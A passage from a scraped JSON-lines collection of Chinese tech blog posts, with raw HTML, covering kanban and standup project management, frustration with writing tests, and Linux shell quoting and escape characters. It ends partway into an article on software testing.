id=\"可量化的工作单元站会与看板\">可量化的工作单元、站会与看板</h3>\n<p>有了可量化的工作单元后，再结合站会和看板，这样，我们每天都可以知道（可视化）团队的工作状态了。延不延期，大家都可以看得到，大家都是成年人了：</p>\n<ul>\n<li>谁做得快，谁捡更多的卡来做的。而且可以捡优先更高的卡先做，也降低延期的风险。我们可以从这个过程中识别人才。</li>\n<li>站会的第3天，人员B还在做_#3_卡，我们其他成员可以加快速度做其它卡以弥补人员B的慢速度，同时项目经理也可以更早的介入这个可能延期的卡中<strong>帮助</strong>人员B</li>\n<li>当出现质量问题时，人员D的卡会被打回Todo多次，因为有站会，我们所有人都很感觉到_#5_这张卡可能存在一定难度或者人员D在协作方式存在问题，这时，我们其他人就会主动帮助人员D解决问题，而不是责怪他。</li>\n</ul>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffh4vnv130j20yg0ly7wh.jpg\"></p>\n<p>慢慢地，团队的协作方式变得以解决问题为导向，而不是以问责为导向。</p>\n<h3 id=\"拆分成可量化的工作单元一样会延期\">拆分成可量化的工作单元，一样会延期</h3>\n<p>但是，我个人的经验看来即使我们将需求拆分成可量化的工作单元，项目一样可能会延期。</p>\n<p>看板只能帮助我们更可视化，更容易地了解到项目当前的状态，对于这个状态，我们的项目经理要如何反应，完成是个人问题了。</p>\n<p>同时，看板也能帮助我们找到延期的根本原因，比如是某个人的卡在In Progress上拖了很长时间、某个人请假了、其它部门中间改需求了、项目人员在某项技术的能力问题……</p>\n<p>所以，要延期的项目一定会延期，我们应该正确面对，找到原因并根本解决。我们要做的只是保证每个人每个工作日都是满负荷的。</p>\n<p>这里，留给大家一个思考题：如果其它外部条件不变，每个人每个工作日都是满负荷了？如何不延期？</p>\n<h3 id=\"拆成可量化的工作单元会增加项目经理的工作量\">拆成可量化的工作单元会增加项目经理的工作量？</h3>\n<p>然而，又会有人说了，这么多项目，我每个项目都要拆分成可量化的，我们项目经理会增加很多工作量。</p>\n<p>其实，如果真的有作用了，这些工作量是值得的，只要你真的理解可量化工作单元的作用。同时，当出现多个项目时，你忙不过来时，说明现在是你培养另一个项目经理的时机了。你可以尝试将一些项目管理的工作交给团队成员来完成。但前提是项目经理本身也是超负荷工作，影响正常工作了。</p>\n<h3 id=\"小结\">小结</h3>\n<p>想让项目不延期，我们首先关注的是如何将需求拆分成可量化的工作单元，然后想办法保证这些工作单元真正被有效的执行。办法通常可以有：</p>\n<ul>\n<li>使用看板可视化所有的工作单元</li>\n<li>通过站会了解工作单元执行过程可能的风险</li>\n<li>通过协作来取长补短</li>\n<li>通过优先级来降低延期时的风险</li>\n<li>通过打包有交集的工作单元减少沟通成本</li>\n</ul>\n<p>通过以上方法可以将团队“调”到可能的最优状态。但是如果还是延期，原因可能就不在团队了。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111137\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111137votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111137\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/large/63918611gy1ffh4v5154qj20go08o0xn.jpg"], "fav_nums": 4, "comment_nums": 3, "create_date": "2017/05/11", "praise_nums": 2}
{"tags": " 1 评论 ,测试,IT技术", "front_image_path": "full/c75c2b12f396df29701f07322b8d52c18d964c3d.jpg", "title": "为何你会觉得写测试很烦？", "url_object_id": "00ca9269faad0b75bda59aa4c2de6092", "url": "http://blog.jobbole.com/111269/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/loadofwar\">loadofwar</a> 翻译，<a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/planet-arkency/testing-is-a-separate-skill-and-thats-why-you-are-frustrated-7239b1500a6c#.lxh51i2yq\">Robert Pankowecki</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>正如标题写的那样，我有这种想法已经很多年了，但是我从没明说出来过。直到上周，一个初级 Rails 开发课程的学员提到他也有同样的感受，才促使我写了这篇文章。</p>\n<blockquote>\n<p style=\"text-align: left;\"><strong>我可以说，我根本不愿意写任何测试。因为写测试太令人抓狂了。</strong></p>\n</blockquote>\n<p>我完全理解这种感觉。而且我知道有这种想法的程序员不在少数。</p>\n<h3>一、为什么这些程序员会对写测试这么抓狂？</h3>\n<p>我想这是因为他们只专注于提升他们编程的能力，却忽略了学习测试方面的知识。其实道理就像在玩一个 RPG 游戏（比如说「上古卷轴」），当你把你角色的弓箭技能点满的时候，你却发现你需要点满单手武器技能才能打通当前的剧情。这时你一定会在心里大喊：<strong>「这简直太坑爹了」！</strong>是的，试想一下，当你苦思冥想的「远程打击」技能在一场近身肉搏混战中没能发挥什么作用时的心情，你就能明白我说的意思。</p>\n<p>其实，在另一种相似的情境里，比如说当你需要学习一门新的编程语言的时候，我们通常也会有这种心态。当你专精于一门语言（像 Ruby），你运用这门语言时，自然会比运用其他语言（比如说 Java 或 PHP）时来得更高效。诚然，你可以在学习新语言时运用你已有的经验，触类旁通。但是，学习新语言的语法，编程范式，IDE 或者理解整个体系依旧是必不可少的。这同样需要花费大量的时间。</p>\n<p>其他类似的情境中，像我们通常要面对不同的开发环境，不同的产品类型（原生的 Windows 桌面应用，浏览器应用和移动端iOS应用），开发人员要游走于前端和后端，甚至当学习两门不同的外语，比如西班牙语和汉语时，我们大都会有同样的心态。</p>\n<p>那么回归到正题，当你舒舒服服地开发着新的功能，突然意识到你需要测试这些功能时（假设这不是一个 TDD 流程），那么这种令人抓狂的情绪必会「如约而至」。这种感觉就像你突然置身于一个不知名的沼泽中，只能靠双腿，慢慢地寻找着出路。</p>\n<h3>二、当面对这种情况时，你有两个选择。</h3>\n<p>第一，任由烦躁和不安的情绪蒙蔽你的心智。这样你可以直接宣布放弃你的测试工作。因为它太难了，根本不值得你浪费时间在上面。或者，你有第二种选择……</p>\n<p>接受事实。承认你现在有关测试方面的知识储备不足，做得很烂。就像你当初刚刚开始编程时，代码一样写得很烂。但渐渐地，你的能力逐步得到了提升。可以理解，<strong>承认自己效率低下，承认自己并不像自己想象的那么优秀</strong>的确很伤自尊。但是这种自我审视，在每个人的职业生涯中，通常是我们面对新事物，并准备开始接受并学习它们时应该有的正常心态。</p>\n<p>我们可能精通一个领域一项技术，而在其他领域其他技术完全是个初学者。你的经验越多，知道得越多，可转移到其他工具的知识就越多。毕竟，现在的科技每五年就要更新一次。你观察到更高层次的概念，也更轻松指出某些新技术所遵循的模式。但在细节上我们可能仍很薄弱，或者掌握得很慢。尤其在尝试一门新技术的初期，这个过程让人很受伤，感觉像流血般难受。这可能是因为你想掌握的技术太尖端，也可能是因为你使用的编程工具大都“棱角尖锐”。而这些都不可避免。</p>\n<p>即使是为一门新语言配置一个环境，都可以让人感到筋疲力尽，让你觉得自己的工作效率一落千丈。同样，对于测试，事实也是如此</p>\n<h3>三、因为测试是一项独立的技术。</h3>\n<p>想想你是什么时候开始编程的。是从大学时代起吗？或是比这更早？当时你是否为你的程序设计了自动化测试流程？如果是，你是否把这个流程应用到每一个你在学校开发的程序上？又或者你已经是一个经历过几次职场变迁的老鸟。想想看是不是每一个你工作过的团队都需要经常为自己的产品写测试？通常情况下，答案都是否定的。其实，每个人在其职业生涯中，分配在开发和测试上的时间通常都会有很大差距。大的需要以「年」为单位来计算。是的，以「年」记！像 3 年开发经验 vs 1 年测试经验，或者 7 年开发 vs 4 年测试，6 个月开发 vs 1 个月测试，等等。</p>\n<h3>四、 3 比 1，7 比 4。难怪你会抓狂。</h3>\n<p>你每天工作 8 小时 （或者更少，欧陆风，你懂的）。你需要在这段时间内不断地切换于编程和测试的工作中（当然，你也可能需要兼顾其他的一些事情，比如像管理，讨论，交流，制定优先目标等等。这些不在今天的讨论范围内）。这种切换模式的确能令人精神分裂。就好比你写字的时候你不能只用惯用手，必须不停地换手。你会发现你一会写得好，一会又写不好，一会写得好，一会又写不好，写得好，写不好，写得好，写不好……</p>\n<h3>五、你以为这种折磨有一天会放过你吗？</h3>\n<p>其实它会！但是你对测试，要「不抛弃，不放弃」，要不断地提高你的测试能力，要建立起测试相关的知识体系和架构。真诚地面对这个问题，接受你需要提高自己的能力才能从中发现乐趣的事实。并努力让你测试和编程的水平相当。如果你能做到这些，相信你会发现你的付出将会是「物有所值」的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111269\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111269votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111269\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/loadofwar\">loadofwar</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/loadofwar\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/loadofwar\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/loadofwar/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/loadofwar/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 16</a> · <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/loadofwar\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/testing-please-do-not-disturb.jpg"], "fav_nums": 1, "comment_nums": 1, "create_date": "2017/05/25", "praise_nums": 1}
{"tags": "IT技术,Linux", "front_image_path": "full/d3d1a5ad957de059084690efae6fdfaa3527e1c3.jpg", "title": "Linux 中引号的那些事", "url_object_id": "90db19b9411013bd9846227ab88ab03a", "url": "http://blog.jobbole.com/111141/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://linuxcommand.org/wss0060.php\">linuxcommand</a>   译文出处：<a target=\"_blank\" href=\"http://article.yeeyan.org/view/90556/299613\">译言</a>   </div><p>我们将把编写脚本的事情暂时搁在一边，然后来讨论一些，我们一直在用的，但是没有解释的东西。引号在这一节里面，我们会讲述引号。引号有两个作用：</p>\n<ol>\n<li>控制字符替换 和</li>\n<li>执行将单词包含在一起的功能</li>\n</ol>\n<p>我们已经使用过引号。在我们的脚本里面，将文本信息赋值给常量的赋值操作就使用了引号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c796c45453307808\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nTITLE=\"System Information for $HOSTNAME\"\r\nRIGHT_NOW=$(date +\"%x %r %Z\")\r\nTIME_STAMP=\"Updated on $RIGHT_NOW by $USER\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c796c45453307808-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c796c45453307808-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c796c45453307808-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c796c45453307808-1\"><span class=\"crayon-v\">TITLE</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"System Information for $HOSTNAME\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c796c45453307808-2\"><span class=\"crayon-v\">RIGHT_NOW</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">date</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"%x %r %Z\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b21c796c45453307808-3\"><span class=\"crayon-v\">TIME_STAMP</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"Updated on $RIGHT_NOW by $USER\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在上面这个例子中，文本信息是被双引号包括住的。我们使用双引号的原因是—我们要把所有单词包括住，当作一个整体来对待。如果我们没有使用引号，那么bash解释器，就会将所有位于第一个单词后面的单词，解释为其他的命令(第一个单词被解释为命令)。</p>\n<p>尝试一下运行下面的命令，看看有什么效果出来：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/fba2caa151e828016e2bd89b1c41599d.png\" alt=\"\"></p>\n<h2>单引号和双引号</h2>\n<p>shell解释器可以识别双引号和单引号。 下面的复制表达式效果是等价的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c796c64737951626\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvar=\"this is some text\"\r\nvar='this is some text'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c796c64737951626-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c796c64737951626-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c796c64737951626-1\"><span class=\"crayon-t\">var</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"this is some text\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c796c64737951626-2\"><span class=\"crayon-t\">var</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'this is some text'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然而，在双引号和单引号之间存在一个重要的差别。 单引号，在字符替换方面有限制。 正如我们在上一节所看到的内容一样，你可以将一个变量放在双引号里面，而shell解释器依然会对变量执行字符替换的操作。</p>\n<p>我们可以通过使用echo命令来查看这种效果：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/4ffc3e0d5fc008600e14e9545df9f58a.png\" alt=\"\"></p>\n<p>如果我们将上述的双引号改为单引号，那么，行为将会改变：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/ecc4df79f8f911ded44a197a58656138.png\" alt=\"\"></p>\n<p>双引号并没有限制—以”$”开头的变量的字符替换，不过，它的确对通配符的扩展效果进行了限制。比如，下面这个例子：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/2a4d36607c896fde990342f855519ca3.png\" alt=\"\"></p>\n<h2>引用单个字符</h2>\n<p>还有另外一种引用字符你会碰到的。 它就是反斜杠。The backslash tells 反斜杠告诉shell解释器忽略反斜杠符后面的第一个字符。比如：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/7c95c159b1ce8f5a5417acf077306aa0.png\" alt=\"\"></p>\n<p>通过使用反斜杠符，shell解释器忽略了对”$”符号进行解释。既然shell已经忽略了”$”，那么，shell解释器也就不会对$HOSTNAME执行字符替换了。 下面，给出一个更有用例子：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/39fbeeb954b27cb0e23946af6c048bd8.png\" alt=\"\"></p>\n<p>正如你所看到的，通过使用反斜杠符号，我们可以将双引号包含在文本里面。</p>\n<h2>反斜杠的其他使用技巧</h2>\n<p>如果，你阅读过任何软件的使用手册，并且这手册是由GNU项目完成的，那么，你会发现，在软件的命令选项中，除了以一个下划线_加一个字母的形式出现之外，还有，以两个下划线加一个完整的单词的形式出现。例如，下面两个语句是等价的：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/28490da8c9f712e03c28b27505fb2895.png\" alt=\"\"></p>\n<p>为什么在软件中，这两种形式都是支持的呢？短的那种形式，是专门为那些懒的输入员而设定的，而长的那种形式，是专门为写脚本而存在的。我有时候，是混合着使用上面的两种形式，然后，我发现采用长的命令选项有用，如果，我写了一个脚本，并且，我将在几个月后去阅读它。看到长的命令选项，有助于我理解这个命令选项是什么意思，从而省却我去查man手册的功夫。现在多敲几下键盘，会以后节省很多功夫。 这样，懒惰的原则就保持住了。</p>\n<p>你有可能会疑虑，使用长的命令形式，会导致一个单独的命令变得很长。 为了与这个问题斗争，你可以使用反斜杠来让shell解释器忽略换行符号，正如下面的操作：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/6a4baccf597c66420ea9c506e69a32e7.png\" alt=\"\"></p>\n<p>这样使用反斜杠，可以让我们将每行的内容包含在一个单独的命令中。让这个技巧可以应用，要注意的地方：换行，必须在反斜杠后面马上出现(也就是，在输入了反斜杠之后，就必须换行了)。 如果，你将一个空格符放置在反斜杠后面，那么，空格符号会被忽略，而不是换行符被忽略。反斜杠符，也可以被用于，将特殊的符号插入到文本。special characters into our text. 这些符号，被叫做—转移字符，下面就有一些转移字符：</p>\n<table cellpadding=\"8\">\n<tbody>\n<tr>\n<td valign=\"top\"><em>转义字符 …………………..</em></td>\n<td valign=\"top\"><em>名字</em></td>\n<td valign=\"top\"><em>可能的用途</em></td>\n</tr>\n<tr>\n<td valign=\"top\">n</td>\n<td valign=\"top\">换行符</td>\n<td valign=\"top\">添加空白行在文本中</td>\n</tr>\n<tr>\n<td valign=\"top\">t</td>\n<td valign=\"top\">制表符</td>\n<td valign=\"top\">将水平制表符添加到文本中</td>\n</tr>\n<tr>\n<td valign=\"top\">a</td>\n<td valign=\"top\">提醒</td>\n<td valign=\"top\">让你的终端发出嘟嘟声。</td>\n</tr>\n<tr>\n<td valign=\"top\"> \\</td>\n<td valign=\"top\">反斜杠</td>\n<td valign=\"top\">插入一个反斜杠符</td>\n</tr>\n<tr>\n<td valign=\"top\">f</td>\n<td valign=\"top\">formfeed</td>\n<td valign=\"top\">Sending this to your printer ejects thepage</td>\n</tr>\n</tbody>\n</table>\n<p>转移字符的应用很常见。非常常见转移字符，这个想法，首先出现在C语言里面。今天 shell解释程序、C++、perl、python、awk、tcl 和其他程序语言都使用了转移字符这个概念。通过使用 echo 命令的 -e 选项，我们将展示上述转移字符的应用：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/c0ecf4e4116233b26e95a509dd6db40c.png\" alt=\"\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111141\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111141votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111141\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/59d49abe8909a122bc2c9aa43b71e3bb.png"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/11", "praise_nums": 1}
{"tags": "测试,软件测试,IT技术", "front_image_path": "full/7b69a14c4ed47454a4037305a13e29006d3e22d2.jpg", "title": "为什么要给软件做测试？如何测试呢？", "url_object_id": "10b661d4c108a57443e6c78b11a6737e", "url": "http://blog.jobbole.com/111293/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/2106382253\">Anne90</a> 翻译，<a href=\"http://www.jobbole.com/members/oliverpp\">蒋生武</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://codewithoutrules.com/2017/03/12/software-testing-big-picture/\">Itamar Turner-Trauring </a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><strong>你为什么应该测试你的软件？你应该如何测试软件？</strong>有些人对这些问题有非常简单的回答。</p>\n<p>及时享乐型的程序员根本懒得去测试，快乐地活在当下。更严肃的程序员会告诉你软件测试是为了开发出高质量的产品。为了可以开发出高质量的产品，必须始终编写单元测试和集成测试，并做 QA 测试。忽略这些，你的代码将会掉入 bug 为患的深渊。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffytn2l5quj20dc0a0dg9.jpg\"></p>\n<p>尽管我更赞同第二种观点，但我认为这不是一个完美的答案。考虑到不同的软件项目的差异，一套答案似乎不可能适合每个人。</p>\n<ul>\n<li>移动游戏、医疗设备和在线商店三者各不相同。</li>\n<li><span style=\"color: #000000;\">每个组织也不尽同的，初创公司和大型跨国企业所拥有的资源是无法相提并论的，和 NASA 也是完全不一样的。</span></li>\n<li>每个项目都会经历不同的阶段，没有用户的产品和有成千上万交易的产品有非常不同的地位</li>\n</ul>\n<p><strong>你需要的不仅仅是一个答案，而是如何去选择适合你情况和需要的答案。</strong>我们首先会考虑适合你的测试方法。然后我们会考虑为什么要测试你的软件。最后，我们将结合方法和目标，来看一下你可以选择什么方式去测试你的软件。</p>\n<h2>你可以用什么样的测试方法？</h2>\n<p>首先，我们考虑下可以使用的不同测试方法。下面的代码是测试吗？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ecaef70411012138\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 